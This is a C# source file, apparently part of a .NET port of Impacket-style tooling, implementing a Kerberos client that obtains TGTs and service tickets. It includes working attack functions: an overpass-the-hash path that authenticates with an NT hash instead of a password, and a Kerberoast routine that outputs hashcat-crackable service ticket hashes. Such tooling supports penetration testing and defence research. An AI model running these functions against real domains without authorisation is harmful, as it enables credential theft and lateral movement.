using System.Security.Cryptography;

namespace DotNetPacket.Protocols.Krb5;

/// <summary>A Ticket-Granting Ticket obtained from the AS exchange: the ticket itself plus the session key.</summary>
public sealed record Tgt(
    byte[] Ticket,
    int SessionKeyEtype,
    byte[] SessionKey,
    DateTimeOffset? EndTime,
    string Realm,
    string User,
    string ServiceName);

/// <summary>A service ticket and its session key, ready to build an AP-REQ against the service.</summary>
public sealed record ServiceTicket(
    byte[] Ticket,
    int SessionKeyEtype,
    byte[] SessionKey,
    string Realm,
    string User);

/// <summary>
/// High-level Kerberos client orchestration. <see cref="GetTgt"/> performs the full pre-auth AS
/// exchange over RC4-HMAC — the getTGT.py path — proving the client key and returning a usable TGT
/// (ticket + session key). This is the foundation the TGS examples (GetUserSPNs, getST) build on.
/// </summary>
public static class KerberosClient
{
    /// <summary>
    /// Requests a TGT for <paramref name="user"/>@<paramref name="realm"/> from the KDC at
    /// <paramref name="kdcHost"/> using an RC4-HMAC PA-ENC-TIMESTAMP pre-auth. Throws with the KDC
    /// error on failure (e.g. wrong password -> KDC_ERR_PREAUTH_FAILED).
    /// </summary>
    public static Tgt GetTgt(string kdcHost, string realm, string user, string password, int port = 88)
        => GetTgtWithKey(kdcHost, realm, user, Krb5Crypto.Rc4StringToKey(password), port);

    /// <summary>
    /// Same as <see cref="GetTgt"/> but with the RC4 client key supplied directly — the NT hash, so
    /// this is the overpass-the-hash / <c>-k -hashes</c> path (no password needed).
    /// </summary>
    public static Tgt GetTgtWithKey(string kdcHost, string realm, string user, byte[] clientKey, int port = 88)
    {
        realm = realm.ToUpperInvariant();

        DateTimeOffset now = DateTimeOffset.UtcNow;
        DateTimeOffset till = now.AddDays(1);
        uint nonce = (uint)(RandomNumberGenerator.GetInt32(int.MaxValue));
        byte[] confounder = RandomNumberGenerator.GetBytes(8);

        byte[] req = AsReq.BuildPreauth(realm, user, clientKey, nonce, till, now, now.Microsecond, confounder);
        KerberosResponse resp = KerberosResponse.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
        if (!resp.IsAsRep)
        {
            throw new InvalidOperationException($"AS exchange failed: {Krb5Constants.DescribeError(resp.ErrorCode)}");
        }

        // AS-REP enc-part is encrypted with the client key, key usage 3 (RC4 maps 3 -> 8).
        byte[] plaintext = Krb5Crypto.Decrypt(clientKey, 3, resp.EncPartCipher);
        EncKdcRepPart part = EncKdcRepPart.Parse(plaintext);

        return new Tgt(resp.Ticket, part.SessionKeyEtype, part.SessionKey, part.EndTime, realm, user, $"krbtgt/{realm}");
    }

    /// <summary>
    /// Requests a service ticket for <paramref name="spn"/> (e.g. <c>cifs/host.realm</c>) using the
    /// TGT, decrypts the TGS-REP enc-part with the TGT session key (key usage 8) to recover the
    /// service session key, and returns the full ticket + that key — the material an AP-REQ needs to
    /// authenticate to the service. This is the getST path behind Kerberos (-k) SMB/LDAP login.
    /// </summary>
    public static ServiceTicket GetServiceTicket(string kdcHost, Tgt tgt, string spn, int port = 88)
    {
        DateTimeOffset now = DateTimeOffset.UtcNow;
        DateTimeOffset till = now.AddDays(1);
        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
        byte[] confounder = RandomNumberGenerator.GetBytes(8);

        byte[] req = TgsReq.Build(tgt, spn, nonce, till, now, now.Microsecond, confounder);
        TgsRep rep = TgsRep.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
        if (!rep.IsTgsRep)
        {
            throw new InvalidOperationException($"TGS exchange failed for {spn}: {Krb5Constants.DescribeError(rep.ErrorCode)}");
        }

        // TGS-REP enc-part is encrypted with the TGT session key, key usage 8.
        byte[] plaintext = Krb5Crypto.Decrypt(tgt.SessionKey, 8, rep.EncPartCipher);
        EncKdcRepPart part = EncKdcRepPart.Parse(plaintext);
        return new ServiceTicket(rep.Ticket, part.SessionKeyEtype, part.SessionKey, tgt.Realm, tgt.User);
    }

    /// <summary>
    /// Requests a service ticket for <paramref name="spn"/> using <paramref name="tgt"/> and returns
    /// the Kerberoast hash string (<paramref name="account"/> is the owning account's name, used only
    /// to label the hash). Throws with the KDC error on failure.
    /// </summary>
    public static string Kerberoast(string kdcHost, Tgt tgt, string spn, string account, int port = 88)
    {
        DateTimeOffset now = DateTimeOffset.UtcNow;
        DateTimeOffset till = now.AddDays(1);
        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
        byte[] confounder = RandomNumberGenerator.GetBytes(8);

        byte[] req = TgsReq.Build(tgt, spn, nonce, till, now, now.Microsecond, confounder);
        TgsRep rep = TgsRep.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
        if (!rep.IsTgsRep)
        {
            throw new InvalidOperationException($"TGS exchange failed for {spn}: {Krb5Constants.DescribeError(rep.ErrorCode)}");
        }

        return KerbTgsRoast.Hashcat(rep.TicketEtype, account, tgt.Realm, spn, rep.TicketCipher);
    }
}
